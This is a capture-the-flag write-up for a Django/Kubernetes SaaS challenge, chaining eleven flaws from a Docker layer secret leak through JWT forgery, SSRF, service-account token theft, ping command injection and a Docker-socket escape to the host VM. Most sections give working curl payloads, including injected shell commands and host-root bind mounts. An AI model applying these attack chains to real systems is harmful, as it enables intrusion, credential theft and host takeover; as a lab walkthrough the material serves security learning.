# HamAmooz Security CTF - Break the SaaS

**Event:** HamAmooz Security CTF  
**Category:** Web / Cloud (Kubernetes)  
**Challenge:** Break the SaaS Internal API

## Overview

The target was a SaaS-style Django/DRF console running in Kubernetes. The UI exposed a dashboard, audit reports, network diagnostics, and a webhook tester. I solved the challenge by first mapping the web application, then chaining web issues into Kubernetes access, and finally using the kind-specific Docker socket setup to reach the original VM.

Actual flag values are intentionally omitted from this writeup.

## F1 - Docker Layer Leak

**Vulnerability:** A sensitive `.env` file was copied into the Docker image in an earlier layer and removed in a later layer. Removing a file in a later Docker layer does not erase it from the previous layer, so anyone who can pull the image can recover it.

**Extraction:** I requested a registry pull token, fetched the manifest for the `backend` tag, downloaded the suspicious small layer, and extracted `app/.env`.

**PoC:**

```bash
TOK=$(curl -sk "https://hub.hamdocker.ir/v2/token?service=harbor-registry&scope=repository:seoeh/hamamooz_challlenges:pull" \
  | python3 -c 'import json,sys;print(json.load(sys.stdin)["token"])')

curl -sk -H "Authorization: Bearer $TOK" \
  -H "Accept: application/vnd.docker.distribution.manifest.v2+json" \
  "https://hub.hamdocker.ir/v2/seoeh/hamamooz_challlenges/manifests/backend" | jq .

mkdir -p layer-check
cd layer-check

curl -sk -H "Authorization: Bearer $TOK" \
  "https://hub.hamdocker.ir/v2/seoeh/hamamooz_challlenges/blobs/sha256:cad298f9538d92ea9901f8de6c41611a63d62c56e914c9bd802ff01080456041" \
  | tar xz

cat app/.env
```

## F2 - Swagger Schema Exposure

**Vulnerability:** The OpenAPI schema was publicly exposed through `/swagger.json`. The schema leaked a flag in `info.description` and revealed hidden API routes.

**Extraction:** I checked `robots.txt`, found schema-related paths, then fetched the Swagger JSON.

**PoC:**

```bash
curl -sk "https://ctf.seoeh.ir/robots.txt"
curl -sk "https://ctf.seoeh.ir/swagger.json" \
  | python3 -c 'import json,sys; print(json.load(sys.stdin)["info"]["description"])'
```

## F3 - Debug Header on Internal Endpoint

**Vulnerability:** `/api/internal/flag` trusted a client-controlled `X-Debug-Mode: true` header and returned a flag without real authentication.

**Extraction:** The route and header were visible in the Swagger schema.

**PoC:**

```bash
curl -sk -H "X-Debug-Mode: true" \
  "https://ctf.seoeh.ir/api/internal/flag"
```

## F4 - Path Traversal in Report Download

**Vulnerability:** The report download endpoint joined a user-controlled filename with `/app/reports` without validating the normalized path. `../` escaped the report directory.

**Extraction:** I changed the normal report filename into `../flag.txt`.

**PoC:**

```bash
curl -sk "https://ctf.seoeh.ir/api/reports/download?file=../flag.txt"
```

## F5 - IDOR in Organization Reports

**Vulnerability:** `/api/orgs/<org_id>/reports/<report_id>` returned report data without checking that the current user belonged to the requested organization.

**Extraction:** I changed the path parameters to request the Globex report.

**PoC:**

```bash
curl -sk "https://ctf.seoeh.ir/api/orgs/2/reports/2"
```

## F6 - JWT Role Forgery

**Vulnerability:** The admin endpoint trusted the JWT `role` claim. The JWT secret was weak (`changeme123`), so a user token could be forged as an admin token.

**Extraction:** I created an HS256 JWT with `role=admin`, signed it with the weak secret, and used it as a Bearer token.

**PoC:**

```bash
ADMIN_TOKEN=$(python3 - <<'PY'
import base64, json, hmac, hashlib

secret = b"changeme123"

def b64raw(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

header = {"alg": "HS256", "typ": "JWT"}
payload = {"sub":"1","username":"acmeuser","org":"Acme Corp","role":"admin"}
h = b64raw(json.dumps(header, separators=(",", ":")).encode())
p = b64raw(json.dumps(payload, separators=(",", ":")).encode())
sig = hmac.new(secret, f"{h}.{p}".encode(), hashlib.sha256).digest()
print(f"{h}.{p}.{b64raw(sig)}")
PY
)

curl -sk "https://ctf.seoeh.ir/admin/dashboard" \
  -H "Authorization: Bearer $ADMIN_TOKEN"
```

## F7 - SSRF to Internal Admin Panel

**Vulnerability:** The webhook tester made server-side requests to arbitrary URLs and returned the response body. The dashboard activity feed leaked the internal admin service name.

**Extraction:** I used the webhook tester to request the internal admin panel service.

**PoC:**

```bash
curl -sk -X POST "https://ctf.seoeh.ir/api/webhooks/test" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://admin-panel.internal-tools.svc.cluster.local/","method":"GET","headers":{}}'
```

## F8 - Kubernetes Secret Read

**Vulnerability:** The backend service account token was readable from the pod, and that service account had enough RBAC permissions to read Kubernetes secrets. SSRF allowed requests to the Kubernetes API from inside the cluster.

**Extraction:** I read the service account token, used it as a Bearer token against the Kubernetes API through SSRF, retrieved `ctf-secrets/flag-secret`, and base64-decoded `data.flag`.

**PoC:**

```bash
K8S_TOKEN=$(curl -sk "https://ctf.seoeh.ir/api/reports/download?file=../../../var/run/secrets/kubernetes.io/serviceaccount/token")

curl -sk -X POST "https://ctf.seoeh.ir/api/webhooks/test" \
  -H "Content-Type: application/json" \
  -d "{\"url\":\"https://kubernetes.default.svc/api/v1/namespaces/ctf-secrets/secrets/flag-secret\",\"method\":\"GET\",\"headers\":{\"Authorization\":\"Bearer $K8S_TOKEN\"}}" \
  | python3 -c 'import json,sys,base64; outer=json.load(sys.stdin); inner=json.loads(outer.get("body", outer if isinstance(outer,str) else "{}")) if isinstance(outer,dict) and "body" in outer else outer; print(base64.b64decode(inner["data"]["flag"]).decode())'
```

## F9 - Command Injection in Ping

**Vulnerability:** The ping diagnostic endpoint passed the user-controlled `host` value into a shell command.

**Extraction:** I appended a second command after the host value and read the hidden diagnostic flag file.

**PoC:**

```bash
curl -sk -X POST "https://ctf.seoeh.ir/api/diag/ping" \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1; cat /opt/.sysdiag-7e3f9a2c4b1d8e5f/flag.txt"}'
```

## F10 - Privileged Pod HostPath

**Vulnerability:** The command injection allowed running `kubectl`. The `legacy-worker` pod in `escape-zone` was privileged and mounted the kind node root filesystem at `/host`.

**Extraction:** I executed into `legacy-worker` and read the flag that its init container had written under `/host/var/lib/node-data`.

**PoC:**

```bash
curl -sk -X POST "https://ctf.seoeh.ir/api/diag/ping" \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1; kubectl -n escape-zone exec legacy-worker -- cat /host/var/lib/node-data/flag.txt"}'
```

## F11 - Docker Socket Escape to the VM

**Vulnerability:** The cluster was deployed with kind. In kind, each Kubernetes node is a Docker container. From the privileged `legacy-worker` pod, the kind node filesystem was available at `/host`, which exposed the Docker socket at `/host/run/docker.sock`. Talking to that Docker API allowed creating a new container with the original VM filesystem bind-mounted.

**Extraction:** I created a Docker container through the socket, bind-mounted `/` to `/host`, and read `/host/home/ubuntu/flag.txt` from the original VM.

**PoC:**

Run this payload in the Network Diagnostics page:

```text
127.0.0.1; kubectl -n escape-zone exec legacy-worker -- sh -c 'curl -s --unix-socket /host/run/docker.sock -X POST "http://localhost/v1.41/containers/create?name=esc" -H "Content-Type: application/json" -d "{\"Image\":\"ctf/backend:latest\",\"User\":\"0\",\"HostConfig\":{\"Binds\":[\"/:/host\"]},\"Cmd\":[\"sh\",\"-c\",\"cat /host/home/ubuntu/flag.txt\"]}"'
```

If the response returns a container ID, start it and read its logs:

```text
127.0.0.1; kubectl -n escape-zone exec legacy-worker -- sh -c 'curl -s --unix-socket /host/run/docker.sock -X POST "http://localhost/v1.41/containers/esc/start"; curl -s --unix-socket /host/run/docker.sock "http://localhost/v1.41/containers/esc/logs?stdout=1&stderr=1"'
```

For the requested persistence proof, create the marker file on the VM:

```text
127.0.0.1; kubectl -n escape-zone exec legacy-worker -- sh -c 'curl -s --unix-socket /host/run/docker.sock -X POST "http://localhost/v1.41/containers/create?name=parmis-persist" -H "Content-Type: application/json" -d "{\"Image\":\"ctf/backend:latest\",\"User\":\"0\",\"HostConfig\":{\"Binds\":[\"/:/host\"]},\"Cmd\":[\"sh\",\"-c\",\"mkdir -p /host/home/ubuntu; printf %s \\\"man Parmisam karam ro amoozidam\\\" > /host/home/ubuntu/SALAM-SALAM; cat /host/home/ubuntu/SALAM-SALAM\"]}"'
```

Then start and read the logs:

```text
127.0.0.1; kubectl -n escape-zone exec legacy-worker -- sh -c 'curl -s --unix-socket /host/run/docker.sock -X POST "http://localhost/v1.41/containers/parmis-persist/start"; curl -s --unix-socket /host/run/docker.sock "http://localhost/v1.41/containers/parmis-persist/logs?stdout=1&stderr=1"'
```

The trick was recognizing that `/host` was not the final VM root yet; it was the kind node container's root. The Docker socket on that node was the bridge to the original VM.
